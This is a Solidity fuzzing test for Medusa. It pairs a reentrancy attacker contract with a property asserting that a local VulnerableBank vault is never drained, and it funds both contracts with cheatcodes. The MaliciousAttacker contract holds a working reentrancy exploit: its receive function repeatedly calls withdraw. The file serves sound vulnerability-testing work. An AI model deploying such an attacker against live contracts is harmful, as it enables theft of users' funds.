pragma solidity ^0.8.13;

import "../contracts/VulnerableBank.sol";

interface HEVM {
    function deal(address who, uint256 newBalance) external;
}

contract MaliciousAttacker {
    VulnerableBank public target;
    HEVM constant hevm = HEVM(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    constructor(VulnerableBank _target) {
        target = _target;
    }

    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw(); 
        }
    }

    function attack() public payable {
        uint256 amount = 1 ether; 
        if(address(this).balance >= amount) {
            target.deposit{value: amount}();
            target.withdraw();
        }
    }
}

contract ReentrancyMedusaTest is MaliciousAttacker {
    constructor() MaliciousAttacker(new VulnerableBank()) {
        // Usamos cheatcodes de Foundry/Medusa para financiar los contratos sin depender del balance del deployer
        hevm.deal(address(target), 10 ether);
        hevm.deal(address(this), 10 ether);
    }

    function property_vault_never_drained() public view returns (bool) {
        return address(target).balance >= 10 ether;
    }
}
